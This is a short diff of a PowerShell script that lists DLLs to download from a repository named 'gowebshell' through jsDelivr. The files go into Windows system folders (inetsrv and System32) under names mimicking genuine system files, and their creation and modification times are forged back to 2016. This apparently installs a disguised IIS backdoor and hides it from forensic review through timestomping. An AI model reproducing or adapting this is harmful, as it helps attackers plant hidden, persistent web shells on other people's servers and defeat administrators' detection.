@@ -1,19 +1,19 @@
 # 定义要下载的文件列表
 $fileList = @(
     @{
-        Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs/bye/8081/x64.dll"
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye@7619874221373e776d6d42f88a749f5974e0535b/x64.dll"
         OutputPath = "C:\Windows\system32\inetsrv\mscorst64.dll"
         CreationTime = Get-Date "2016-07-16 21:18:00"
         ModificationTime = Get-Date "2016-07-16 21:18:00"
     },
     @{
-        Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs/bye/8081/x32.dll"
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye@7619874221373e776d6d42f88a749f5974e0535b/x32.dll"
         OutputPath = "C:\Windows\system32\inetsrv\mscorst.dll"
         CreationTime = Get-Date "2016-07-17 10:30:00"
         ModificationTime = Get-Date "2016-07-17 10:30:00"
     },
     @{
-        Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs/bye/8081/infocard.dll"
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye@7619874221373e776d6d42f88a749f5974e0535b/infocard.dll"
         OutputPath = "C:\Windows\System32\infocard.dll"
         CreationTime = Get-Date "2016-07-18 14:45:00"
         ModificationTime = Get-Date "2016-07-18 14:45:00"
